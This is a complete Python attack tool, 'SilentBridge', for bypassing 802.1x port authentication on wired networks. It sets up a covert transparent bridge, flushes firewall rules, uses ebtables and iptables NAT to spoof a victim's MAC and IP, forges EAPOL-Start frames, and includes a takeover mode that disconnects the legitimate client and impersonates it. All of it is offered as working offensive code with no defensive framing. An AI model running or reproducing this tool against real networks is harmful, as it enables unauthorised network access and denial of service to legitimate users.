#!/usr/bin/env python3

import os
import time
import argparse
import subprocess
import netifaces
from scapy.all import Ether, EAPOL, sendp

class SilentBridge:
    def __init__(self):
        self.parser = self._create_parser()
        self.args = None
    
    def _create_parser(self):
        parser = argparse.ArgumentParser(description='SilentBridge - 802.1x Bypass Tool')
        
        subparsers = parser.add_subparsers(dest='command', help='Commands')
        
        # Create bridge command
        create_parser = subparsers.add_parser('create', help='Create a transparent bridge')
        create_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        create_parser.add_argument('--phy', required=True, help='Physical interface connected to the network')
        create_parser.add_argument('--upstream', required=True, help='Upstream interface')
        create_parser.add_argument('--sidechannel', required=True, help='Side channel interface for management')
        create_parser.add_argument('--egress-port', type=int, default=22, help='Egress port for side channel')
        
        # Destroy bridge command
        destroy_parser = subparsers.add_parser('destroy', help='Destroy a bridge')
        destroy_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        
        # Add interaction command
        interact_parser = subparsers.add_parser('interact', help='Add interaction to bridge')
        interact_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        interact_parser.add_argument('--phy', required=True, help='Physical interface connected to the network')
        interact_parser.add_argument('--upstream', required=True, help='Upstream interface')
        interact_parser.add_argument('--sidechannel', required=True, help='Side channel interface for management')
        interact_parser.add_argument('--egress-port', type=int, default=22, help='Egress port for side channel')
        interact_parser.add_argument('--client-mac', required=True, help='Client MAC address to impersonate')
        interact_parser.add_argument('--client-ip', required=True, help='Client IP address to impersonate')
        interact_parser.add_argument('--gw-mac', required=True, help='Gateway MAC address')
        
        # Force reauthentication command
        reauth_parser = subparsers.add_parser('reauth', help='Force 802.1x reauthentication')
        reauth_parser.add_argument('--interface', required=True, help='Interface to send EAPOL-Start from')
        reauth_parser.add_argument('--client-mac', required=True, help='Client MAC address to impersonate')
        
        # Takeover command
        takeover_parser = subparsers.add_parser('takeover', help='Take over client connection by creating a virtual interface')
        takeover_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        takeover_parser.add_argument('--phy', required=True, help='Physical interface to remove from bridge')
        takeover_parser.add_argument('--client-mac', required=True, help='Client MAC address to impersonate')
        takeover_parser.add_argument('--client-ip', required=True, help='Client IP address to impersonate')
        takeover_parser.add_argument('--netmask', default='255.255.255.0', help='Network mask for client IP')
        takeover_parser.add_argument('--gateway-ip', required=True, help='Gateway IP address')
        takeover_parser.add_argument('--veth-name', default='veth0', help='Name for the virtual ethernet device')
        
        return parser
    
    def run(self):
        self.args = self.parser.parse_args()
        
        if self.args.command == 'create':
            self.create_transparent_bridge()
        elif self.args.command == 'destroy':
            self.destroy_bridge()
        elif self.args.command == 'interact':
            self.add_interaction()
        elif self.args.command == 'reauth':
            self.force_reauthentication()
        elif self.args.command == 'takeover':
            self.takeover_client()
        else:
            self.parser.print_help()
    
    def run_command(self, command, shell=False):
        """Run a shell command and return output"""
        try:
            if shell:
                result = subprocess.run(command, shell=True, check=True, 
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                       universal_newlines=True)
            else:
                result = subprocess.run(command.split(), check=True, 
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                       universal_newlines=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            print(f"Command failed: {e}")
            print(f"Error output: {e.stderr}")
            return None
    
    def make_bridge_transparent(self, bridge_name):
        """Configure bridge to be completely transparent"""
        print("[*] Making bridge completely transparent...")
        
        # Disable STP on the bridge
        self.run_command(f"brctl stp {bridge_name} off")
        
        # Set bridge ageing time to 0 (don't age out entries)
        self.run_command(f"brctl setageing {bridge_name} 0")
        
        # Disable multicast snooping
        if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/bridge/multicast_snooping"):
            self.run_command(f"echo 0 > /sys/devices/virtual/net/{bridge_name}/bridge/multicast_snooping", shell=True)
        
        # Set forward delay to 0
        self.run_command(f"brctl setfd {bridge_name} 0")
        
        # Enable promiscuous mode on the bridge
        self.run_command(f"ip link set {bridge_name} promisc on")
        
        # Set group_fwd_mask to forward all BPDUs and other reserved addresses
        self.run_command(f"echo 0xffff > /sys/class/net/{bridge_name}/bridge/group_fwd_mask", shell=True)
        
        # Disable IGMP snooping if available
        if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/bridge/multicast_igmp_version"):
            self.run_command(f"echo 0 > /sys/devices/virtual/net/{bridge_name}/bridge/multicast_igmp_version", shell=True)
        
        # Disable bridge learning
        for iface in os.listdir(f"/sys/devices/virtual/net/{bridge_name}/brif"):
            if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/brif/{iface}/learning"):
                self.run_command(f"echo 0 > /sys/devices/virtual/net/{bridge_name}/brif/{iface}/learning", shell=True)
    
    def create_transparent_bridge(self):
        """Create a transparent bridge without interaction"""
        print("[*] Creating transparent bridge...")
        
        # Get upstream MAC address
        upstream_mac = netifaces.ifaddresses(self.args.upstream)[netifaces.AF_LINK][0]['addr']
        
        # Load br_netfilter kernel module
        print("[*] Making sure br_netfilter kernel module is loaded...")
        self.run_command("modprobe br_netfilter")
        
        # Disable IPv6
        print("[*] Disabling IPv6...")
        self.run_command("echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6", shell=True)
        
        # Reset firewall rules
        print("[*] Resetting firewall rules...")
        self.run_command("iptables -F")
        self.run_command("ebtables -F")
        self.run_command("arptables -F")
        
        # Create the bridge
        print(f"[*] Creating bridge {self.args.bridge}...")
        self.run_command(f"brctl addbr {self.args.bridge}")
        
        # Make the bridge completely transparent
        self.make_bridge_transparent(self.args.bridge)
        
        # Enable 802.1x forwarding
        print("[*] Enabling 802.1x forwarding...")
        self.run_command(f"echo 8 > /sys/class/net/{self.args.bridge}/bridge/group_fwd_mask", shell=True)
        
        # Enable IP forwarding
        print("[*] Enabling IP forwarding...")
        self.run_command("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        
        # Add interfaces to the bridge
        print("[*] Adding interfaces to the bridge...")
        self.run_command(f"brctl addif {self.args.bridge} {self.args.phy}")
        self.run_command(f"brctl addif {self.args.bridge} {self.args.upstream}")
        
        # Bring both sides of the bridge up
        print("[*] Bringing interfaces up in promiscuous mode...")
        self.run_command(f"ifconfig {self.args.phy} 0.0.0.0 up promisc")
        self.run_command(f"ifconfig {self.args.upstream} 0.0.0.0 up promisc")
        
        time.sleep(2)
        
        # Initiate radio silence
        print("[*] Initiating radio silence...")
        self.run_command(f"iptables -A OUTPUT -o {self.args.sidechannel} -p tcp --dport {self.args.egress_port} -j ACCEPT")
        self.run_command(f"iptables -I INPUT -i {self.args.sidechannel} -m state --state ESTABLISHED,RELATED -j ACCEPT")
        self.run_command(f"arptables -A OUTPUT -o {self.args.sidechannel} -j ACCEPT")
        self.run_command("iptables -A OUTPUT -j DROP")
        self.run_command("arptables -A OUTPUT -j DROP")
        
        # Bring the bridge up
        print("[*] Bringing the bridge up...")
        self.run_command(f"macchanger -m {upstream_mac} {self.args.bridge}")
        self.run_command(f"ifconfig {self.args.bridge} 0.0.0.0 up promisc")
        
        # Lift radio silence
        print("[*] Lifting radio silence...")
        self.run_command("iptables -D OUTPUT -j DROP")
        self.run_command("arptables -D OUTPUT -j DROP")
        
        # Reset the links
        print("[*] Resetting the links...")
        self.run_command(f"ethtool -r {self.args.upstream}")
        self.run_command(f"ethtool -r {self.args.phy}")
        
        print("[+] Bridge created successfully!")
    
    def destroy_bridge(self):
        """Destroy the bridge and free all interfaces"""
        print(f"[*] Destroying bridge {self.args.bridge}...")
        
        # Get all interfaces in the bridge
        try:
            bridge_interfaces = os.listdir(f"/sys/devices/virtual/net/{self.args.bridge}/brif")
            
            # Bring down all interfaces
            print("[*] Bringing down all interfaces...")
            for iface in bridge_interfaces:
                self.run_command(f"ifconfig {iface} down")
            
            # Bring down the bridge
            print("[*] Bringing down the bridge...")
            self.run_command(f"ifconfig {self.args.bridge} down")
            
            # Remove interfaces from the bridge
            print("[*] Removing interfaces from the bridge...")
            for iface in bridge_interfaces:
                self.run_command(f"brctl delif {self.args.bridge} {iface}")
            
            # Delete the bridge
            print("[*] Deleting the bridge...")
            self.run_command(f"brctl delbr {self.args.bridge}")
            
            print("[+] Bridge destroyed successfully!")
            
        except (FileNotFoundError, subprocess.CalledProcessError) as e:
            print(f"[!] Error: {e}")
    
    def add_interaction(self):
        """Add interaction to transparent bridge"""
        print("[*] Adding interaction to bridge...")
        
        # Get upstream MAC address
        upstream_mac = netifaces.ifaddresses(self.args.upstream)[netifaces.AF_LINK][0]['addr']
        
        # Make sure br_netfilter is loaded
        print("[*] Making sure br_netfilter kernel module is loaded...")
        self.run_command("modprobe br_netfilter")
        
        # Disable IPv6
        print("[*] Disabling IPv6...")
        self.run_command("echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6", shell=True)
        
        # Make sure the bridge is completely transparent
        self.make_bridge_transparent(self.args.bridge)
        
        # Initiate radio silence
        print("[*] Initiating radio silence...")
        self.run_command(f"iptables -A OUTPUT -o {self.args.sidechannel} -p tcp --dport {self.args.egress_port} -j ACCEPT")
        self.run_command(f"iptables -I INPUT -i {self.args.sidechannel} -m state --state ESTABLISHED,RELATED -j ACCEPT")
        self.run_command(f"arptables -A OUTPUT -o {self.args.sidechannel} -j ACCEPT")
        self.run_command("iptables -A OUTPUT -j DROP")
        self.run_command("arptables -A OUTPUT -j DROP")
        
        time.sleep(3)
        
        # Bring the bridge up with a specific IP
        print("[*] Bringing the bridge up...")
        self.run_command(f"ifconfig {self.args.bridge} 169.254.66.66 up promisc")
        
        time.sleep(3)
        
        # Establish Layer 2 source NAT
        print("[*] Establishing Layer 2 source NAT...")
        self.run_command(f"ebtables -t nat -A POSTROUTING -s {upstream_mac} -o {self.args.upstream} -j snat --to-src {self.args.client_mac}")
        self.run_command(f"ebtables -t nat -A POSTROUTING -s {upstream_mac} -o {self.args.bridge} -j snat --to-src {self.args.client_mac}")
        
        time.sleep(3)
        
        # Set default gateway and static ARP entry
        print("[*] Setting default gateway and static ARP entry...")
        self.run_command(f"arp -s -i {self.args.bridge} 169.254.66.1 {self.args.gw_mac}")
        self.run_command("route add default gw 169.254.66.1")
        
        time.sleep(3)
        
        # Establish Layer 3 source NAT
        print("[*] Establishing Layer 3 source NAT...")
        self.run_command(f"iptables -t nat -A POSTROUTING -o {self.args.bridge} -s 169.254.66.66 -p tcp -j SNAT --to {self.args.client_ip}:61000-62000")
        self.run_command(f"iptables -t nat -A POSTROUTING -o {self.args.bridge} -s 169.254.66.66 -p udp -j SNAT --to {self.args.client_ip}:61000-62000")
        self.run_command(f"iptables -t nat -A POSTROUTING -o {self.args.bridge} -s 169.254.66.66 -p icmp -j SNAT --to {self.args.client_ip}")
        
        time.sleep(3)
        
        # Lift radio silence
        print("[*] Lifting radio silence...")
        self.run_command("iptables -D OUTPUT -j DROP")
        self.run_command("arptables -D OUTPUT -j DROP")
        
        print("[+] Interaction added successfully!")
    
    def force_reauthentication(self):
        """Force 802.1x reauthentication by sending EAPOL-Start packet"""
        print(f"[*] Forcing reauthentication for {self.args.client_mac}...")
        
        # Send EAPOL-Start packet
        try:
            sendp(Ether(src=self.args.client_mac, dst="01:80:c2:00:00:03")/EAPOL(type=1), 
                  iface=self.args.interface)
            print("[+] EAPOL-Start packet sent successfully!")
        except Exception as e:
            print(f"[!] Error sending EAPOL-Start packet: {e}")
    
    def takeover_client(self):
        """Take over client connection by removing phy interface from bridge and creating a virtual interface"""
        print("[*] Starting client takeover operation...")
        
        try:
            # Check if the bridge exists
            if not os.path.exists(f"/sys/class/net/{self.args.bridge}"):
                print(f"[!] Bridge {self.args.bridge} does not exist!")
                return
            
            # Check if the physical interface is in the bridge
            bridge_interfaces = os.listdir(f"/sys/devices/virtual/net/{self.args.bridge}/brif")
            if self.args.phy not in bridge_interfaces:
                print(f"[!] Physical interface {self.args.phy} is not in bridge {self.args.bridge}!")
                return
            
            # Remove the physical interface from the bridge
            print(f"[*] Removing {self.args.phy} from bridge {self.args.bridge}...")
            self.run_command(f"ifconfig {self.args.phy} down")
            self.run_command(f"brctl delif {self.args.bridge} {self.args.phy}")
            
            # Check if the virtual interface already exists and remove it if it does
            if os.path.exists(f"/sys/class/net/{self.args.veth_name}"):
                print(f"[*] Virtual interface {self.args.veth_name} already exists, removing it...")
                self.run_command(f"ip link delete {self.args.veth_name}")
            
            # Create a virtual ethernet device
            print(f"[*] Creating virtual ethernet device {self.args.veth_name}...")
            self.run_command(f"ip link add {self.args.veth_name} type veth peer name {self.args.veth_name}_peer")
            
            # Add the virtual interface to the bridge
            print(f"[*] Adding {self.args.veth_name}_peer to bridge {self.args.bridge}...")
            self.run_command(f"brctl addif {self.args.bridge} {self.args.veth_name}_peer")
            self.run_command(f"ifconfig {self.args.veth_name}_peer up promisc")
            
            # Make sure the bridge is still completely transparent
            self.make_bridge_transparent(self.args.bridge)
            
            # Set the MAC address of the virtual interface to the client's MAC
            print(f"[*] Setting MAC address of {self.args.veth_name} to {self.args.client_mac}...")
            self.run_command(f"ifconfig {self.args.veth_name} down")
            self.run_command(f"macchanger -m {self.args.client_mac} {self.args.veth_name}")
            
            # Configure the virtual interface with the client's IP
            print(f"[*] Configuring {self.args.veth_name} with client IP {self.args.client_ip}...")
            self.run_command(f"ifconfig {self.args.veth_name} {self.args.client_ip} netmask {self.args.netmask} up promisc")
            
            # Add default route
            print(f"[*] Setting default gateway to {self.args.gateway_ip}...")
            # First delete any existing default routes
            try:
                self.run_command("ip route del default")
            except:
                pass  # Ignore if no default route exists
            
            self.run_command(f"ip route add default via {self.args.gateway_ip} dev {self.args.veth_name}")
            
            # Enable IP forwarding
            print("[*] Enabling IP forwarding...")
            self.run_command("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
            
            # Reset the link
            print("[*] Resetting the link...")
            try:
                self.run_command(f"ethtool -r {self.args.veth_name}")
            except:
                pass  # Some virtual interfaces don't support link reset
            
            print(f"[+] Takeover complete! The system is now using {self.args.veth_name} with client's MAC and IP.")
            print(f"[+] The client has been disconnected from the network.")
            
        except Exception as e:
            print(f"[!] Error during takeover: {e}")

if __name__ == "__main__":
    bridge = SilentBridge()
    bridge.run() 